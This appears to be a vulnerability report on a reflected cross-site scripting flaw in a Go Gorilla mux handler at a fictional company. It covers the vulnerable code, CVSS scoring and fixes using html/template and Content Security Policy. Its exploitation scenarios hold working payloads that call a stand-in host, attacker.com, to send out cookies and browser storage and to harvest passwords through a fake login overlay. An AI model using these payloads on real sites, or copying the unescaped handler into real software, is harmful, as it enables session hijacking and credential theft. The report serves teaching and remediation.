# Cross-Site Scripting (XSS) in Go Web Application

# Vulnerability Case
During a targeted security assessment of Acme Corp's Go-based web application, we discovered an XSS vulnerability within an endpoint built using the Gorilla mux router. The issue was identified when untrusted user input from query parameters was directly concatenated into the HTTP response via Go’s ResponseWriter without proper sanitization. During manual and automated testing, crafted payloads containing malicious JavaScript were successfully rendered by the client browser, confirming the vulnerability. This flaw was found in a module handling user-supplied data in an environment that leverages the Gorilla web toolkit, indicative of a critical risk to user session integrity.

```go
package main

import (
	"net/http"
	"github.com/gorilla/mux"
)

func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
	// Untrusted user input is retrieved directly from the query string.
	userInput := r.URL.Query().Get("input")
	
	// Vulnerable code: Directly writing user-controlled input to the response.
	w.Write([]byte("<html><body>User input: " + userInput + "</body></html>"))
}

func main() {
	r := mux.NewRouter()
	r.HandleFunc("/vulnerable", vulnerableHandler)
	http.ListenAndServe(":8080", r)
}
```

Exploitation of this vulnerability involves injecting malicious JavaScript (e.g., using `<script>` tags) into the unvalidated user input, which is then rendered in the victim’s browser. An attacker can craft a URL with a malicious payload that, when visited, executes arbitrary scripting code, potentially stealing session cookies or performing actions on behalf of the user. Given that the application is part of Acme Corp's critical infrastructure—built using Go and the Gorilla stack—the exploitation could lead to severe business impacts, including unauthorized account access, data leakage, and damage to the company’s reputation.


context: go.gorilla.xss.gorilla-no-direct-write-to-responsewriter-traint.gorilla-no-direct-write-to-responsewriter-taint Untrusted input could be used to tamper with a web page rendering, which can lead to a Cross-site scripting (XSS) vulnerability. XSS vulnerabilities occur when untrusted input executes malicious JavaScript code, leading to issues such as account compromise and sensitive information leakage. To prevent this vulnerability, validate the user input, perform contextual output encoding or sanitize the input. For more information, see: [Go XSS prevention](https://semgrep.dev/docs/cheat-sheets/go-xss/).

# Vulnerability Breakdown
This vulnerability involves an unsanitized direct output of user-controlled data in a Go web application built with the Gorilla mux router.

1. **Key vulnerability elements**:
   - User input from query parameters is retrieved using `r.URL.Query().Get("input")`
   - The input is directly concatenated into HTML output without any sanitization
   - The resulting string is written directly to the HTTP response via `w.Write([]byte())`
   - No content type headers are explicitly set, allowing the browser to interpret injected JavaScript
   - No input validation or output encoding is implemented

2. **Potential attack vectors**:
   - Crafting malicious URLs with JavaScript payloads in the query parameters
   - Distributing these malicious links through email, social media, or compromised websites
   - Social engineering to trick users into clicking the specially crafted links
   - Session hijacking by stealing cookies and authentication tokens
   - Performing unauthorized actions on behalf of victims

3. **Severity assessment**:
   - The vulnerability allows direct execution of arbitrary JavaScript in users' browsers
   - The impact primarily affects confidentiality and integrity, with less direct impact on availability
   - Attack is remotely exploitable through network access
   - No special privileges or user interaction beyond visiting a link is required
   - As part of Acme Corp's critical infrastructure, exploitation could have significant business impact

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Changed (C)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

# Description
A Cross-Site Scripting (XSS) vulnerability exists in Acme Corp's Go-based web application using the Gorilla mux router. The vulnerability occurs in the `/vulnerable` endpoint handler where user input from query parameters is retrieved and directly inserted into HTML output without any sanitization or encoding.

```go
func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
	// Untrusted user input is retrieved directly from the query string.
	userInput := r.URL.Query().Get("input")
	
	// Vulnerable code: Directly writing user-controlled input to the response.
	w.Write([]byte("<html><body>User input: " + userInput + "</body></html>"))
}

```

This vulnerability allows attackers to craft malicious URLs containing JavaScript code that, when visited by users, will execute in their browsers within the context of the application. The lack of input validation, output encoding, or Content-Type headers creates a direct path for script injection, potentially leading to session hijacking, sensitive data theft, or unauthorized actions performed on behalf of the victim.

# CVSS
**Score**: 6.0 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N \
**Severity**: Medium

The Medium severity rating (CVSS score 6.0) is derived from the following factors:

- **Network Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the internet by crafting malicious URLs.

- **Low Attack Complexity (AC:L)**: Exploitation is straightforward, requiring only basic knowledge of HTML and JavaScript to craft an effective XSS payload.

- **No Privileges Required (PR:N)**: An attacker doesn't need any privileges or authentication to exploit the vulnerability.

- **User Interaction Required (UI:R)**: The victim must visit the malicious URL for the attack to succeed, typically through social engineering or phishing.

- **Changed Scope (S:C)**: The vulnerability allows the attacker's code to execute in the victim's browser in the context of the vulnerable application, effectively changing the security scope from the server to the client.

- **Low Confidentiality Impact (C:L)**: The attacker can access data available in the victim's browser context, potentially including cookies, authentication tokens, and other sensitive information displayed on the page.

- **Low Integrity Impact (I:L)**: The attacker can modify content displayed to the user and potentially initiate actions as the victim within the application.

- **No Availability Impact (A:N)**: The vulnerability doesn't typically impact the availability of the application itself.

While this is rated as Medium severity, it's important to note that in a real-world context, the business impact could be more significant if the application processes or displays sensitive data, handles authentication, or allows critical actions that could be performed via XSS.

# Exploitation Scenarios
**Scenario 1: Cookie Theft and Session Hijacking**
An attacker crafts a malicious URL pointing to the vulnerable endpoint with a JavaScript payload designed to steal cookies:
```
https://acme-app.com/vulnerable?input=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

```
The attacker then distributes this URL via phishing emails to Acme Corp employees or customers. When a victim clicks the link, their browser renders the page and executes the injected script, sending their session cookies to the attacker's server. With these cookies, the attacker can hijack the victim's session and gain unauthorized access to their account.

**Scenario 2: Stored Credentials Theft**
If the application uses client-side storage for sensitive data, an attacker could craft a payload to extract this information:
```
https://acme-app.com/vulnerable?input=<script>fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify({localStorage: localStorage, sessionStorage: sessionStorage})})</script>

```
This payload sends all data stored in localStorage and sessionStorage to the attacker's server, potentially including cached credentials, personal information, or application data.

**Scenario 3: Phishing Through UI Manipulation**
An attacker creates a more sophisticated payload that injects a fake login form into the legitimate application:
```
https://acme-app.com/vulnerable?input=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999"><h2>Session Expired</h2><form onsubmit="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({username:this.username.value,password:this.password.value})});return false"><input name="username" placeholder="Username"><input name="password" placeholder="Password" type="password"><button>Login</button></form></div>

```
This injection creates a full-page overlay that appears to be part of the legitimate application, tricking users into submitting their credentials directly to the attacker.

# Impact Analysis
**Business Impact:**
- Unauthorized access to user accounts through session hijacking, potentially affecting customer trust and satisfaction
- Potential breach of sensitive user data, which may trigger regulatory compliance issues (GDPR, CCPA, etc.)
- Reputational damage if exploits become public or widespread
- Financial losses due to fraud if the application handles financial transactions
- Legal liability for failure to adequately protect user data
- Resources required for incident response, customer support, and communications if a breach occurs

**Technical Impact:**
- Compromise of user sessions allowing attackers to perform actions as legitimate users
- Theft of authentication tokens, cookies, and other sensitive browser-accessible data
- Ability to perform unauthorized operations within the application on behalf of victims
- Collection of sensitive data visible in the application interface
- Potential for more severe exploitation if combined with other vulnerabilities
- Bypassing of client-side security controls
- Distribution of malware through trusted application domains

# Technical Details
The vulnerability exists in a Go web application using the Gorilla mux router, specifically in the `vulnerableHandler` function that processes requests to the `/vulnerable` endpoint.

```go
func vulnerableHandler(w http.ResponseWriter, r *http.Request) {
	// Untrusted user input is retrieved directly from the query string.
	userInput := r.URL.Query().Get("input")
	
	// Vulnerable code: Directly writing user-controlled input to the response.
	w.Write([]byte("<html><body>User input: " + userInput + "</body></html>"))
}

```

The vulnerability occurs due to three critical issues in this code:

1. **Direct Input Retrieval Without Validation**: The handler retrieves user input directly from the query string using `r.URL.Query().Get("input")` without performing any validation on the content or structure of that input.

2. **Lack of Output Encoding**: The user input is concatenated directly into an HTML string without any encoding or escaping of special characters. This allows HTML and JavaScript to be injected into the document structure.

3. **Improper Content Type Handling**: The application does not explicitly set the Content-Type header to a safe value like `text/plain`. By default, browsers will interpret the response as HTML and execute any injected scripts.

**Exploitation Mechanics:**

When an attacker crafts a URL like:
```
https://acme-app.com/vulnerable?input=<script>alert(document.cookie)</script>

```

The following sequence occurs:

1. The browser sends a GET request to `/vulnerable` with the query parameter `input` containing the malicious script.

2. The Go application retrieves this input and constructs the response:
   ```html
   <html><body>User input: <script>alert(document.cookie)</script></body></html>
   
```

3. The browser receives this response, parses it as HTML, and executes the injected JavaScript code within the context of the acme-app.com domain.

4. The script executes with the same privileges as the application, having access to cookies, local storage, and the DOM of the page.

This is a classic Reflected XSS vulnerability, where the attack payload is reflected back in the immediate response to the victim's request, rather than being stored in the application's database.

The vulnerability is particularly concerning because:

1. The application is using a mature web framework (Gorilla mux) but lacks basic security controls
2. The issue is in a production environment as part of Acme Corp's critical infrastructure
3. The simplicity of exploitation makes it accessible to even low-skilled attackers

# Remediation Steps
## Implement HTML Escaping

**Priority**: P0

Replace the direct string concatenation with proper HTML escaping using Go's `html/template` package:

```go
func safeHandler(w http.ResponseWriter, r *http.Request) {
	// Get user input from query string
	userInput := r.URL.Query().Get("input")
	
	// Create a template with proper escaping
	t := template.Must(template.New("page").Parse("<html><body>User input: {{.}}</body></html>"))
	
	// Execute the template with the user input
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	err := t.Execute(w, userInput)
	if err != nil {
		http.Error(w, "Template error", http.StatusInternalServerError)
	}
}

```

This implementation automatically handles HTML escaping, preventing the browser from interpreting the user input as HTML or JavaScript. The `html/template` package in Go is specifically designed to protect against XSS attacks by escaping HTML special characters.
## Implement Content Security Policy

**Priority**: P1

Add Content Security Policy headers to provide an additional layer of protection against XSS attacks:

```go
func secureHandler(w http.ResponseWriter, r *http.Request) {
	// Set Content Security Policy header
	w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'")
	
	// Get user input from query string
	userInput := r.URL.Query().Get("input")
	
	// Use template with proper escaping (as shown in P0 remediation)
	t := template.Must(template.New("page").Parse("<html><body>User input: {{.}}</body></html>"))
	
	// Set content type and execute template
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	err := t.Execute(w, userInput)
	if err != nil {
		http.Error(w, "Template error", http.StatusInternalServerError)
	}
}

```

This CSP configuration restricts the page to only load scripts from the same origin, providing defense-in-depth against XSS attacks even if other protections fail. The policy can be customized based on the application's specific requirements.


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A05:2021 | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
